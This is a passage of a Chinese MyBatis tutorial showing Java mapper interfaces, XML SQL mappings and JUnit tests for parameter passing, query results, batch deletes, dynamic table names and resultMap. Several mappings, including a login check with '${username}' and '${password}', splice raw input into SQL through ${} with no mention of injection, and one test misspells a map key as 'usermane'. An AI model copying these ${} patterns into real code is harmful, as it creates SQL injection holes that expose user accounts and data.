<p>&#x82E5; mapper &#x63A5;&#x53E3;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x53C2;&#x6570;&#x4E3A;&#x591A;&#x4E2A;&#x65F6;&#xFF0C;&#x53EF;&#x624B;&#x52A8;&#x521B;&#x5EFA; map &#x96C6;&#x5408;&#x5E76;&#x5C06;&#x6570;&#x636E;&#x653E;&#x5165;&#xFF0C;&#x901A;&#x8FC7; <code>${}</code> &#x548C; <code>#{}</code> &#x8BBF;&#x95EE; map &#x96C6;&#x5408;&#x7684;&#x952E;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x76F8;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#xFF0C;&#x6CE8;&#x610F; <code>${}</code> &#x9700;&#x8981;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<pre><code class="language-java">public interface ParameterMapper { ...
    // &#x9A8C;&#x8BC1;&#x767B;&#x5F55; =&gt; &#x53C2;&#x6570;&#x4E3A;map
    User checkLoginByMap(Map&lt;String,Object&gt; map);
}
</code></pre>
<pre><code class="language-xml">&lt;!--User checkLoginByMap(Map&lt;String,Object&gt; map);--&gt;
&lt;select id=&quot;checkLoginByMap&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = #{username} and password = #{password} &lt;/select&gt;
</code></pre>
<pre><code class="language-java">@Test
public void checkLoginByMap() {
	SqlSession sqlSession = SqlSessionUtils.getSqlSession();
	ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class);
	Map&lt;String,Object&gt; map = new HashMap&lt;&gt;();
	map.put(&quot;usermane&quot;,&quot;admin&quot;);
	map.put(&quot;password&quot;,&quot;123456&quot;);
	User user = mapper.checkLoginByMap(map);
	System.out.println(user);
}
</code></pre>
<h3 id="%E5%AE%9E%E4%BD%93%E7%B1%BB%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0">&#x5B9E;&#x4F53;&#x7C7B;&#x7C7B;&#x578B;&#x53C2;&#x6570;</h3>
<p>&#x82E5; mapper &#x63A5;&#x53E3;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x53C2;&#x6570;&#x4E3A;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x65F6;&#xFF0C;&#x53EF;&#x4F7F;&#x7528; <code>${}</code> &#x548C; <code>#{}</code>&#xFF0C;&#x901A;&#x8FC7;&#x8BBF;&#x95EE;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x5C5E;&#x6027;&#x540D;&#x83B7;&#x53D6;&#x5C5E;&#x6027;&#x503C;&#xFF0C;&#x6CE8;&#x610F; <code>${}</code> &#x9700;&#x8981;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<pre><code class="language-java">public interface ParameterMapper { ...
    // &#x6DFB;&#x52A0;&#x7528;&#x6237;&#x4FE1;&#x606F;
    Integer insertUser(User user);
}
</code></pre>
<pre><code class="language-xml">&lt;!-- int insertUser(User user); --&gt;
&lt;!-- &#x5C5E;&#x6027;&#x548C;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x5173;&#x7CFB;&#x4E0D;&#x5927;&#xFF0C;&#x4E0D;&#x8FC7;&#x4E0D;&#x5426;&#x8BA4;&#x662F;&#x6210;&#x5458;&#x53D8;&#x91CF;&#xFF0C;&#x4E3B;&#x8981;&#x770B;&#x5F97;&#x662F; set &#x548C; get &#x65B9;&#x6CD5;&#xFF01;&#xFF01;&#xFF01;&#xFF01;&#xFF01; --&gt;
&lt;select id=&quot;insertUser&quot;&gt; insert into t_user values(null,#{username},#{password},#{age},#{sex},#{email}) &lt;/select&gt;
</code></pre>
<pre><code class="language-java">@Test
public void insertUser() {
	SqlSession sqlSession = SqlSessionUtils.getSqlSession();
	ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class);
	User user = new User(null,&quot;gz&quot;,&quot;123456&quot;,20,&quot;&#x7537;&quot;,&quot;gz@mail.com&quot;);
	mapper.insertUser(user);
}
</code></pre>
<h3 id="param-%E6%A0%87%E8%AF%86%E5%8F%82%E6%95%B0">@Param &#x6807;&#x8BC6;&#x53C2;&#x6570;</h3>
<p>&#x4F7F;&#x7528; <code>@Param</code> &#x6CE8;&#x89E3;&#x6807;&#x8BC6;&#x7684; mapper &#x63A5;&#x53E3;&#x4E2D;&#x7684;&#x65B9;&#x6CD5;&#x53C2;&#x6570;&#x4F1A;&#x88AB;&#x52A0;&#x5165; map &#x96C6;&#x5408;&#xFF0C;&#x53EF;&#x901A;&#x8FC7; <code>${}</code> &#x548C; <code>#{}</code> &#x8BBF;&#x95EE;&#x6B64;&#x96C6;&#x5408;&#x7684;&#x952E;&#x4EE5;&#x83B7;&#x53D6;&#x5BF9;&#x5E94;&#x503C;&#xFF0C;&#x6CE8;&#x610F; <code>${}</code> &#x9700;&#x8981;&#x624B;&#x52A8;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<pre><code class="language-java">public interface ParameterMapper { ...
    // &#x9A8C;&#x8BC1;&#x767B;&#x5F55; =&gt; @Param
    User checkLoginByParam(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password);
}
</code></pre>
<pre><code class="language-xml">&lt;!-- User checkLoginByParam(@Param(&quot;username&quot;) String username, @Param(&quot;password&quot;) String password); --&gt;
&lt;select id=&quot;checkLoginByParam&quot; resultType=&quot;User&quot;&gt; select * from t_user where username = &apos;${username}&apos; and password = &apos;${password}&apos; &lt;/select&gt;
</code></pre>
<pre><code class="language-java">@Test
public void testCheckLoginByParam(){
    SqlSession sqlSession = SqlSessionUtils.getSqlSession();
    ParameterMapper mapper = sqlSession.getMapper(ParameterMapper.class);
    User user = mapper.checkLoginByParam(&quot;hz&quot;, &quot;123321&quot;);
    System.out.println(user);
}
</code></pre>
<h3 id="param-%E6%B3%A8%E8%A7%A3%E6%BA%90%E7%A0%81">@Param &#x6CE8;&#x89E3;&#x6E90;&#x7801;</h3>
<p>convertArgsToSqlCommandParam =&gt; getNamedParams =&gt; this.names = Collections.unmodifiableSortedMap(map);</p>
<p>param1 &#x5F00;&#x59CB;&#x662F;&#x56E0;&#x4E3A; GENERIC_NAME_PREFIX + 1&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="crud">CRUD</h2>
<h3 id="mybatis-%E7%9A%84%E6%9F%A5%E8%AF%A2">MyBatis &#x7684;&#x67E5;&#x8BE2;</h3>
<p>&#x82E5;&#x67E5;&#x8BE2;&#x51FA;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4E00;&#x6761;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x3001;List &#x96C6;&#x5408;&#x4EE5;&#x53CA; Map &#x96C6;&#x5408;&#x63A5;&#x6536;&#x3002;&#x5982;&#x679C;&#x67E5;&#x8BE2;&#x51FA;&#x7684;&#x6570;&#x636E;&#x6709;&#x591A;&#x6761;&#xFF0C;&#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x4E0D;&#x80FD;&#x7528;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x8FDB;&#x884C;&#x63A5;&#x6536;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38; TooManyResultsException&#xFF0C;&#x5E94;&#x8BE5;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x7C7B;&#x7C7B;&#x578B;&#x7684; List &#x96C6;&#x5408;&#x3001;Map &#x7C7B;&#x578B;&#x7684; List &#x96C6;&#x5408;&#x6216;&#x5728; mapper &#x63A5;&#x53E3;&#x7684;&#x65B9;&#x6CD5;&#x4E0A;&#x6DFB;&#x52A0; @MapKey &#x6CE8;&#x89E3;&#x8868;&#x793A;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;&#x4E3A;&#x952E;&#x8FDB;&#x884C;&#x63A5;&#x6536;&#x3002;</p>
<pre><code class="language-java">public interface SelectMapper {
    // &#x6839;&#x636E;id&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x4FE1;&#x606F;
    List&lt;User&gt; getUserById(@Param(&quot;id&quot;) Integer id);
    // &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x7528;&#x6237;&#x4FE1;&#x606F;
    List&lt;User&gt; getAllUser();
    // &#x67E5;&#x8BE2;&#x7528;&#x6237;&#x8868;&#x603B;&#x8BB0;&#x5F55;&#x6570;
    Integer getCount();
    // &#x6839;&#x636E;id&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E3A;&#x4E00;&#x4E2A;map&#x96C6;&#x5408;
    Map&lt;String, Object&gt; getuserByIdToMap(@Param(&quot;id&quot;) Integer id);
    // &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E3A; map &#x96C6;&#x5408;
    List&lt;Map&lt;String, Object&gt;&gt; getAllUserToMap();
    // &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x7528;&#x6237;&#x4FE1;&#x606F;&#x4E3A; map &#x96C6;&#x5408; =&gt; &#x6CE8;&#x89E3;
    @MapKey(&quot;id&quot;)
    Map&lt;String, Object&gt; getAllUserToMapAnother();
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.SelectMapper&quot;&gt;
    &lt;!-- User getUserById(@Param(&quot;id&quot;) Integer id); --&gt;
    &lt;select id=&quot;getUserById&quot; resultType=&quot;User&quot;&gt;
        select * from t_user where id = #{id}
    &lt;/select&gt;
    &lt;!-- List&lt;User&gt; getAllUser(); --&gt;
    &lt;select id=&quot;getAllUser&quot; resultType=&quot;User&quot;&gt;
        select * from t_user
    &lt;/select&gt;
    &lt;!-- Integer getCount(); --&gt;
    &lt;select id=&quot;getCount&quot; resultType=&quot;java.lang.Integer&quot;&gt;
        &lt;!-- &#x6CE8;&#x610F;&#x5982;&#x679C;count(&#x5B57;&#x6BB5;)&#x5BF9;&#x5E94;null&#x5219;&#x4E0D;&#x4F1A;&#x653E;&#x5165;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;;count(*) &#x548C; count(1) &#x7ED3;&#x679C;&#x662F;&#x4E00;&#x6837;&#x7684; --&gt;
        select count(*) from t_user
    &lt;/select&gt;
    &lt;!-- Map&lt;String, Object&gt; getuserByIdToMap(@Param(&quot;id&quot;) Integer id); --&gt;
    &lt;select id=&quot;getuserByIdToMap&quot; resultType=&quot;java.util.Map&quot;&gt;
        select * from t_user where id = #{id}
    &lt;/select&gt;
    &lt;!-- List&lt;Map&lt;String, Object&gt;&gt; getAllUserToMap(); --&gt;
    &lt;select id=&quot;getAllUserToMap&quot; resultType=&quot;map&quot;&gt;
        select * from t_user
    &lt;/select&gt;
    &lt;!--
    @MapKey(&quot;id&quot;)
    Map&lt;String, Object&gt; getAllUserToMapAnother();
    --&gt;
    &lt;select id=&quot;getAllUserToMapAnother&quot; resultType=&quot;map&quot;&gt;
        select * from t_user
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class SelectMapperTest {
    /**
     * MyBatis &#x5404;&#x79CD;&#x67E5;&#x8BE2;&#x529F;&#x80FD;
     * 1.&#x82E5;&#x67E5;&#x8BE2;&#x51FA;&#x7684;&#x6570;&#x636E;&#x53EA;&#x6709;&#x4E00;&#x6761;,&#x5219;&#x53EF;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x6216;&#x8005; &quot;&#x96C6;&#x5408;&quot; &#x6216;&#x8005; map &#x63A5;&#x6536;
     * 2.&#x82E5;&#x67E5;&#x8BE2;&#x51FA;&#x6570;&#x636E;&#x591A;&#x6761;,&#x4E00;&#x5B9A;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x63A5;&#x6536;,&#x6B64;&#x65F6;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38; TooManyResultsException,&#x53EF;&#x901A;&#x8FC7;&#x5B9E;&#x4F53;&#x7C7B;&#x5BF9;&#x8C61;&#x7684;list&#x63A5;&#x6536;;&#x53EF;&#x901A;&#x8FC7; map &#x7C7B;&#x578B;&#x7684;&#x96C6;&#x5408;&#x63A5;&#x6536;;&#x53EF;&#x4EE5;&#x5728;mapper&#x63A5;&#x53E3;&#x7684;&#x65B9;&#x6CD5;&#x4E0A;&#x6DFB;&#x52A0;@Mapkey&#x6CE8;&#x89E3;,&#x6B64;&#x65F6;&#x6BCF;&#x6761;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x7684;map&#x96C6;&#x5408;&#x4F5C;&#x4E3A;&#x503C;,&#x4EE5;&#x67D0;&#x4E2A;&#x5B57;&#x6BB5;&#x4F5C;&#x4E3A;&#x952E;,&#x653E;&#x5728;&#x540C;&#x4E00;&#x4E2A;map&#x96C6;&#x5408;&#x4E2D;
     */
    @Test
    public void testGetUserById(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getUserById(3));
    }
    @Test
    public void testGetAllUser(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getAllUser());
    }
    @Test
    public void testGetCount(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getCount());
    }
    @Test
    public void testUserByIdToMap(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getuserByIdToMap(3));
    }
    @Test
    public void testAllUserToMap(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getAllUserToMap());
    }
    @Test
    public void testAllUserToMapAnother(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SelectMapper mapper = sqlSession.getMapper(SelectMapper.class);
        System.out.println(mapper.getAllUserToMapAnother());
    }
}
</code></pre>
<h3 id="%E7%89%B9%E6%AE%8A-sql-%E6%89%A7%E8%A1%8C">&#x7279;&#x6B8A; SQL &#x6267;&#x884C;</h3>
<ul>
<li>&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;</li>
</ul>
<pre><code class="language-java">public interface SQLMapper {
    // &#x6839;&#x636E;&#x7528;&#x6237;&#x540D;&#x6A21;&#x7CCA;&#x67E5;&#x8BE2;&#x7528;&#x6237;&#x4FE1;&#x606F;
    List&lt;User&gt; getUserByLike(@Param(&quot;username&quot;) String username);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.SQLMapper&quot;&gt;
    &lt;!-- List&lt;User&gt; getUserByLike(@Param(&quot;username&quot;)String username); --&gt;
    &lt;select id=&quot;getUserByLike&quot; resultType=&quot;User&quot;&gt;
        &lt;!-- select * from t_user where username like &apos;%#{username}%&apos; =&gt; org.apache.ibatis.exceptions.PersistenceException --&gt;
        &lt;!-- select * from t_user where username like &apos;%${username}%&apos; --&gt;
        &lt;!-- select * from t_user where username like concat(&apos;%&apos;,#{username},&apos;%&apos;) --&gt;
        select * from t_user where username like &quot;%&quot;#{username}&quot;%&quot;
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class SQLMapperTest {
    @Test
    public void testSQLMapper(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SQLMapper mapper = sqlSession.getMapper(SQLMapper.class);
        List&lt;User&gt; list = mapper.getUserByLike(&quot;g&quot;);
        System.out.println(list);
    }
}
</code></pre>
<ul>
<li>&#x6279;&#x91CF;&#x5220;&#x9664;</li>
</ul>
<p>&#x53EA;&#x80FD;&#x4F7F;&#x7528; <code>${}</code>&#x3002;&#x5982;&#x679C;&#x4F7F;&#x7528; <code>#{}</code>&#xFF0C;&#x5219;&#x89E3;&#x6790;&#x540E;&#x7684; sql &#x8BED;&#x53E5;&#x4F1A;&#x5C06;&#x4F20;&#x5165;&#x53C2;&#x6570;&#x89C6;&#x4F5C;&#x4E00;&#x4E2A;&#x6574;&#x4F53;&#xFF0C;&#x8FD9;&#x4E2A;&#x6574;&#x4F53;&#x4E0D;&#x4F1A;&#x88AB;&#x6210;&#x529F;&#x5339;&#x914D;&#x3002;</p>
<pre><code class="language-java">public interface SQLMapper {
    // &#x6279;&#x91CF;&#x5220;&#x9664;
    int deleteMore(@Param(&quot;ids&quot;) String ids);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.SQLMapper&quot;&gt;
    &lt;!-- int deleteMore(@Param(&quot;ids&quot;) String ids); --&gt;
    &lt;delete id=&quot;deleteMore&quot;&gt;
        &lt;!-- &#x6279;&#x91CF;&#x5220;&#x9664;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; #{} =&gt; #{} &#x4F1A;&#x81EA;&#x52A8;&#x52A0;&#x4E0A;&#x5355;&#x5F15;&#x53F7; --&gt;
        delete from t_user where id in (${ids})
    &lt;/delete&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class SQLMapperTest {
    @Test
    public void testDeleteMore(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SQLMapper mapper = sqlSession.getMapper(SQLMapper.class);
        int i = mapper.deleteMore(&quot;1,2,6&quot;);
        System.out.println(i);
    }
}
</code></pre>
<ul>
<li>&#x52A8;&#x6001;&#x8BBE;&#x7F6E;&#x8868;&#x540D;</li>
</ul>
<p>&#x53EA;&#x80FD;&#x4F7F;&#x7528; <code>${}</code>&#xFF0C;&#x56E0;&#x8868;&#x540D;&#x4E0D;&#x80FD;&#x52A0;&#x5355;&#x5F15;&#x53F7;&#x3002;</p>
<pre><code class="language-java">public interface SQLMapper {
    // &#x67E5;&#x8BE2;&#x6307;&#x5B9A;&#x8868;&#x4E2D;&#x6570;&#x636E;
    List&lt;User&gt; getUserByTableName(@Param(&quot;tableName&quot;) String tableName);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.SQLMapper&quot;&gt;
    &lt;!-- List&lt;User&gt; getUserByTableName(@Param(&quot;tableName&quot;) String tableName); --&gt;
    &lt;select id=&quot;getUserByTableName&quot; resultType=&quot;User&quot;&gt;
        &lt;!-- &#x8FD9;&#x91CC;&#x8981;&#x6CE8;&#x610F;&#x8868;&#x540D;&#x4E0D;&#x80FD;&#x52A0;&#x5355;&#x5F15;&#x53F7; =&gt; &#x53EA;&#x80FD;&#x4F7F;&#x7528; ${} --&gt;
        select * from ${tableName}
    &lt;/select&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class SQLMapperTest {
    @Test
    public void testGetUserByTableName(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SQLMapper mapper = sqlSession.getMapper(SQLMapper.class);
        List&lt;User&gt; list = mapper.getUserByTableName(&quot;t_user&quot;);
        System.out.println(list);
    }
}
</code></pre>
<ul>
<li>&#x6DFB;&#x52A0;&#x529F;&#x80FD;&#x83B7;&#x53D6;&#x81EA;&#x589E;&#x7684;&#x4E3B;&#x952E;</li>
</ul>
<p>&#x5728; mapper.xml &#x4E2D;&#x8BBE;&#x7F6E;&#x5C5E;&#x6027; <code>useGeneratedKeys</code> &#x548C; <code>keyProperty</code>&#x3002;&#x56E0;&#x4E3A;&#x589E;&#x5220;&#x6539;&#x6709;&#x7EDF;&#x4E00;&#x53D7;&#x5F71;&#x54CD;&#x7684;&#x884C;&#x6570;&#x7684;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x80FD;&#x5C06;&#x83B7;&#x53D6;&#x7684;&#x81EA;&#x589E;&#x4E3B;&#x952E;&#x653E;&#x5728;&#x4F20;&#x8F93;&#x7684;&#x53C2;&#x6570;&#x5BF9;&#x8C61;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x5C5E;&#x6027;&#x3002;</p>
<pre><code class="language-java">public interface SQLMapper {
    // &#x6DFB;&#x52A0;&#x7528;&#x6237;&#x4FE1;&#x606F;
    void insertUser(User user);
}
</code></pre>
<pre><code class="language-xml">&lt;mapper namespace=&quot;com.zszy.mybatis.mapper.SQLMapper&quot;&gt;
    &lt;!-- void insertUser(User user); --&gt;
    &lt;!-- useGeneratedKeys &#x8BBE;&#x7F6E;&#x5F53;&#x524D;&#x6807;&#x7B7E;&#x4E2D; sql &#x4F7F;&#x7528;&#x4E86;&#x81EA;&#x589E;&#x7684;&#x4E3B;&#x952E; --&gt;
    &lt;!-- keyProperty &#x5C06;&#x81EA;&#x589E;&#x7684;&#x4E3B;&#x952E;&#x7684;&#x503C;&#x8D4B;&#x503C;&#x7ED9;&#x4F20;&#x8F93;&#x5230;&#x6620;&#x5C04;&#x6587;&#x4EF6;&#x4E2D;&#x53C2;&#x6570;&#x7684;&#x67D0;&#x4E2A;&#x5C5E;&#x6027; --&gt;
    &lt;!-- &#x5E94;&#x7528;&#x573A;&#x666F; =&gt; &#x4E00;&#x5BF9;&#x591A;&#x3001;&#x591A;&#x5BF9;&#x591A; &#x8BBE;&#x7F6E;&#x4E2D;&#x95F4;&#x8868;&#x7684;&#x4E3B;&#x952E; --&gt;
    &lt;insert id=&quot;insertUser&quot; useGeneratedKeys=&quot;true&quot; keyProperty=&quot;id&quot;&gt;
        insert into t_user values (null,#{username},#{password},#{age},#{sex},#{email})
    &lt;/insert&gt;
&lt;/mapper&gt;
</code></pre>
<pre><code class="language-java">public class SQLMapperTest {
    @Test
    public void testInsertUser(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        SQLMapper mapper = sqlSession.getMapper(SQLMapper.class);
        User user = new User(null,&quot;hz&quot;,&quot;123321&quot;,24,&quot;&#x7537;&quot;,&quot;hz@mail.com&quot;);
        mapper.insertUser(user);
        System.out.println(user); // &#x6267;&#x884C;&#x6DFB;&#x52A0;&#x64CD;&#x4F5C;&#x540E;id&#x6709;&#x503C;
    }
}
</code></pre>
<h3 id="%E7%BB%93%E6%9E%9C%E9%9B%86%E8%87%AA%E5%AE%9A%E4%B9%89%E6%98%A0%E5%B0%84-resultmap">&#x7ED3;&#x679C;&#x96C6;|&#x81EA;&#x5B9A;&#x4E49;&#x6620;&#x5C04; resultMap</h3>
<p>&#x7B80;&#x5355;&#x6620;&#x5C04;&#x8BED;&#x53E5;&#x4E2D;&#x4E0D;&#x4E00;&#x5B9A;&#x9700;&#x8981;&#x663E;&#x5F0F;&#x6307;&#x5B9A; resultMap&#xFF0C;&#x53EA;&#x9700;&#x4F7F;&#x7528; resultType &#x6307;&#x5B9A;&#x80FD;&#x591F;&#x63A5;&#x6536;&#x7684;&#x5B58;&#x50A8;&#x7C7B;&#x578B;&#x5373;&#x53EF;&#x3002;&#x4F46;&#x8FD9;&#x79CD;&#x8BED;&#x53E5;&#x53EA;&#x662F;&#x7B80;&#x5355;&#x5730;&#x5C06;&#x6240;&#x6709;&#x7684;&#x5217;&#x6620;&#x5C04;&#x5230;&#x5B58;&#x50A8;&#x7C7B;&#x578B;&#x7684;&#x952E;&#x4E0A;&#xFF0C;&#x4E0D;&#x80FD;&#x50CF; JavaBean &#x8FD9;&#x822C;&#x7684;&#x9886;&#x57DF;&#x6A21;&#x578B;&#x5BF9;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x5404;&#x4E2A;&#x5B9E;&#x4F53;&#x53CA;&#x5176;&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;&#x8FDB;&#x884C;&#x63CF;&#x8FF0;&#x3002;</p>
<p>&#x5F53;&#x9886;&#x57DF;&#x6A21;&#x578B;&#x901A;&#x8FC7; resultType &#x6307;&#x5B9A;&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x4F1A;&#x5728;&#x5E55;&#x540E;&#x81EA;&#x52A8;&#x521B;&#x5EFA;&#x4E00;&#x4E2A; resultMap&#xFF0C;&#x518D;&#x6839;&#x636E;&#x5C5E;&#x6027;&#x540D;&#x6765;&#x6620;&#x5C04;&#x5217;&#x5230; JavaBean &#x7684;&#x5C5E;&#x6027;&#x4E0A;&#x3002;&#x6CE8;&#x610F;&#xFF0C;&#x82E5;&#x5B57;&#x6BB5;&#x540D;&#x548C;&#x5B9E;&#x4F53;&#x7C7B;&#x4E2D;&#x5C5E;&#x6027;&#x540D;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x81EA;&#x5B9A;&#x4E49;&#x6620;&#x5C04;&#x3002;</p>
<pre><code class="language-java">public interface EmpMapper {
    // &#x67E5;&#x8BE2;&#x6240;&#x6709;&#x6570;&#x636E;
    List&lt;Emp&gt; getAllEmp();
}
</code></pre>
<pre><code class="language-xml">&lt;!-- &#x4E0B;&#x8FB9;&#x4E24;&#x79CD;&#x6307;&#x5B9A;&#x6548;&#x679C;&#x4E00;&#x81F4; --&gt;
&lt;!-- resultType &#x6307;&#x5B9A;&#x9886;&#x57DF;&#x6A21;&#x578B; --&gt;
&lt;select id=&quot;getAllEmp&quot; resultType=&quot;Emp&quot;&gt;
    select eid as &quot;eid&quot;, emp_name as &quot;empName&quot;, age as &quot;age&quot;, sex as &quot;sex&quot;, email as &quot;email&quot; FROM t_emp
&lt;/select&gt;
&lt;!-- resultMap &#x6307;&#x5B9A;&#x9886;&#x57DF;&#x6A21;&#x578B; --&gt;
&lt;resultMap id=&quot;empResultMap&quot; type=&quot;Emp&quot;&gt;
    &lt;!-- id &#x4E13;&#x95E8;&#x8BBE;&#x7F6E;&#x4E3B;&#x952E;&#x6620;&#x5C04;&#x5173;&#x7CFB; --&gt;
    &lt;id property=&quot;eid&quot; column=&quot;eid&quot;&gt;&lt;/id&gt;
    &lt;!-- result &#x8BBE;&#x7F6E;&#x666E;&#x901A;&#x5B57;&#x6BB5;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB; --&gt;
    &lt;result property=&quot;empName&quot; column=&quot;emp_name&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;age&quot; column=&quot;age&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;sex&quot; column=&quot;sex&quot;&gt;&lt;/result&gt;
    &lt;result property=&quot;email&quot; column=&quot;email&quot;&gt;&lt;/result&gt;
&lt;/resultMap&gt;
&lt;select id=&quot;getAllEmp&quot;  resultMap=&quot;empResultMap&quot;&gt;
    select * from t_emp
&lt;/select&gt;
</code></pre>
<pre><code class="language-java">public class ResultMapTest {
    @Test
    public void testGetAllEmp(){
        SqlSession sqlSession = SqlSessionUtils.getSqlSession();
        EmpMapper mapper = sqlSession.getMapper(EmpMapper.class);
        List&lt;Emp&gt; allEmp = mapper.getAllEmp();
        allEmp.forEach(emp -&gt; System.out.println(emp));
    }
}
</code></pre>
<p>&#x6838;&#x5FC3;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D; <code>&lt;setting&gt;</code> &#x6807;&#x7B7E;&#x7684; <code>mapUnderscoreToCamelCase</code> &#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x67E5;&#x8BE2;&#x8868;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x5C06; _ &#x7C7B;&#x578B;&#x7684;&#x5B57;&#x6BB5;&#x540D;&#x81EA;&#x52A8;&#x8F6C;&#x6362;&#x4E3A;&#x9A7C;&#x5CF0;&#x3002;</p>
<p>&#x5728;&#x63D0;&#x4F9B;&#x4E86;&#x7ED3;&#x679C;&#x6620;&#x5C04;&#x540E;&#xFF0C;&#x81EA;&#x52A8;&#x6620;&#x5C04;&#x4E5F;&#x80FD;&#x5DE5;&#x4F5C;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5BF9;&#x4E8E;&#x6BCF;&#x4E00;&#x4E2A;&#x7ED3;&#x679C;&#x6620;&#x5C04;&#xFF0C;&#x5728; ResultSet &#x51FA;&#x73B0;&#x7684;&#x5217;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BBE;&#x7F6E;&#x624B;&#x52A8;&#x6620;&#x5C04;&#xFF0C;&#x5C06;&#x88AB;&#x81EA;&#x52A8;&#x6620;&#x5C04;&#x3002;&#x5728;&#x81EA;&#x52A8;&#x6620;&#x5C04;&#x5904;&#x7406;&#x5B8C;&#x6BD5;&#x540E;&#xFF0C;&#x518D;&#x5904;&#x7406;&#x624B;&#x52A8;&#x6620;&#x5C04;&#x3002;</p>
<pre><code class="language-xml">&lt;settings&gt;
    &lt;setting name=&quot;mapUnderscoreToCamelCase&quot; value=&quot;true&quot;/&gt;
&lt;/settings&gt;
</code></pre>
<h3 id="%E5%A4%9A%E5%AF%B9%E4%B8%80%E6%98%A0%E5%B0%84%E5%A4%84%E7%90%86">&#x591A;&#x5BF9;&#x4E00;&#x6620;&#x5C04;&#x5904;&#x7406;</h3>
<ul>
<li>&#x7EA7;&#x8054;&#x5C5E;&#x6027;&#x8D4B;&#x503C;</li>
</ul>
<pre><code class="language-java">public interface EmpMapper {
